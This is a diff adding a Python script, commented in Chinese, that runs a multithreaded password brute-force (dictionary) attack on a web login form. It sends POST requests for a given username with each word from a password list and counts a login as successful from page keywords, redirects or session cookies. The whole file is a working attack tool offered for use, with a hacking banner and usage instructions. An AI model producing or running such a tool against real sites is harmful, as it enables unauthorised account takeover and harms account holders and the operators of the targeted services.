@@ -1,0 +1,176 @@
+import requests
+import sys
+import time
+from threading import Thread, Lock
+from queue import Queue
+
+# 全局变量
+found = False
+lock = Lock()
+request_count = 0
+
+def print_banner():
+    banner = """
+    ██▓███   ▒█████   ██▀███   ▄████▄  ▓█████ 
+    ▓██░  ██▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
+    ▓██░ ██▓▒▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
+    ▒██▄█▓▒ ▒▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
+    ▒██▒ ░  ░░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
+    ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
+    ░▒ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
+    ░░       ░ ░ ░ ▒    ░░   ░ ░           ░   
+                ░ ░     ░     ░ ░         ░  ░
+                            ░                 
+    POST请求密码爆破工具 - 单个用户模式
+    """
+    print(banner)
+
+def load_passwords(password_file):
+    """加载密码字典"""
+    try:
+        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
+            passwords = [line.strip() for line in f if line.strip()]
+        return passwords
+    except FileNotFoundError:
+        print(f"[错误] 密码文件 {password_file} 不存在")
+        return None
+
+def test_password(target_url, username, password, delay, timeout=10):
+    """测试单个密码"""
+    global found, request_count
+    
+    # 如果已经找到正确密码，则停止
+    if found:
+        return False
+    
+    # 构造POST数据（根据实际情况调整）
+    data = {
+        'username': username,
+        'password': password,
+        'submit': 'Login'
+        # 可能需要添加其他参数，如CSRF token等
+    }
+    
+    # 设置请求头（根据实际情况调整）
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Connection': 'keep-alive'
+    }
+    
+    try:
+        # 发送POST请求
+        response = requests.post(
+            target_url,
+            data=data,
+            headers=headers,
+            timeout=timeout,
+            allow_redirects=True  # 允许重定向，登录成功后通常会重定向
+        )
+        
+        with lock:
+            request_count += 1
+        
+        # 判断是否成功（根据实际情况调整）
+        # 方法1: 检查响应内容中的关键字
+        if "登录成功" in response.text or "dashboard" in response.text.lower():
+            return True
+        
+        # 方法2: 检查重定向URL
+        if response.history and "login" not in response.url:
+            return True
+            
+        # 方法3: 检查Cookie（如果有会话Cookie则可能成功）
+        if "session" in response.cookies or "auth" in response.cookies:
+            return True
+            
+        # 延迟以避免请求过快
+        time.sleep(delay)
+        
+    except requests.exceptions.RequestException as e:
+        print(f"[错误] 请求失败: {e}")
+    
+    return False
+
+def worker(target_url, username, password_queue, delay, results):
+    """工作线程函数"""
+    global found
+    
+    while not found and not password_queue.empty():
+        password = password_queue.get()
+        
+        # 显示当前测试的密码
+        print(f"\r尝试密码: {password.ljust(20)}", end="")
+        
+        if test_password(target_url, username, password, delay):
+            with lock:
+                found = True
+            results['success'] = True
+            results['password'] = password
+            print(f"\n[+] 爆破成功! 用户名: {username} 密码: {password}")
+        
+        password_queue.task_done()
+
+def main():
+    print_banner()
+    
+    # 参数检查
+    if len(sys.argv) != 4:
+        print("用法: python post_password_spray.py <目标URL> <用户名> <密码字典文件>")
+        print("示例: python post_password_spray.py http://example.com/login admin passwords.txt")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    username = sys.argv[2]
+    password_file = sys.argv[3]
+    
+    # 加载密码字典
+    passwords = load_passwords(password_file)
+    if not passwords:
+        sys.exit(1)
+    
+    print(f"[*] 目标URL: {target_url}")
+    print(f"[*] 用户名: {username}")
+    print(f"[*] 加载密码数量: {len(passwords)}")
+    print(f"[*] 开始爆破...\n")
+    
+    # 设置参数
+    delay = 0.5  # 请求间隔(秒)
+    thread_count = 5  # 线程数
+    results = {'success': False, 'password': None}
+    
+    # 创建密码队列
+    password_queue = Queue()
+    for password in passwords:
+        password_queue.put(password)
+    
+    # 创建并启动工作线程
+    threads = []
+    for i in range(thread_count):
+        thread = Thread(
+            target=worker, 
+            args=(target_url, username, password_queue, delay, results)
+        )
+        thread.daemon = True
+        thread.start()
+        threads.append(thread)
+    
+    # 等待所有线程完成或找到密码
+    try:
+        while any(thread.is_alive() for thread in threads) and not found:
+            time.sleep(0.5)
+        password_queue.join()
+    except KeyboardInterrupt:
+        print("\n[!] 用户中断操作")
+        sys.exit(1)
+    
+    # 输出结果
+    print(f"\n\n[*] 完成! 总请求数: {request_count}")
+    if results['success']:
+        print(f"[+] 找到密码: {results['password']}")
+    else:
+        print("[-] 未找到正确密码")
+
+if __name__ == "__main__":
+    main()
